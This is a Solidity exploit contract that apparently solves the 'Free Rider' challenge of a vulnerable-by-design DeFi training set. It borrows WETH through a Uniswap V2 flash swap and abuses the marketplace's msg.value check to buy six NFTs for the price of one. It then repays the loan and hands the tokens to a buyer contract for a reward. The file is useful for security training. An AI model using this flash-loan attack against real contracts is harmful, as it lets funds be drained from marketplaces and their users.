//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderBuyer.sol";

interface UniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IWETH9 {
    function withdraw(uint amount0) external;
    function deposit() external payable;
    function transfer(address dst, uint wad) external returns (bool);
    function balanceOf(address addr) external returns (uint);
}

contract Attacker6 is IUniswapV2Callee {
    UniswapV2Pair private uniPair;
    FreeRiderNFTMarketplace private marketPlace;
    IWETH9 private weth;
    ERC721 private nft;
    FreeRiderBuyer private buyer;
    uint256[] private tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        address _uniPair,
        address payable _marketPlace,
        address _weth,
        address _nft,
        address _buyer
    ) {
        uniPair = UniswapV2Pair(_uniPair);
        marketPlace = FreeRiderNFTMarketplace(_marketPlace);
        weth = IWETH9(_weth);
        nft = ERC721(_nft);
        buyer = FreeRiderBuyer(_buyer);
    }

    function exploit(uint256 amount) public payable {
        uniPair.swap(amount, 0, address(this), new bytes(1));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        weth.withdraw(amount0);
        marketPlace.buyMany{value: address(this).balance}(tokenIds);
        weth.deposit{value: address(this).balance}();
        weth.transfer(address(uniPair), weth.balanceOf(address(this)));

        uint256 i;
        while (i<tokenIds.length) {
            nft.safeTransferFrom(address(this), address(buyer), i);

            unchecked {
                i++;
            }
        }
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}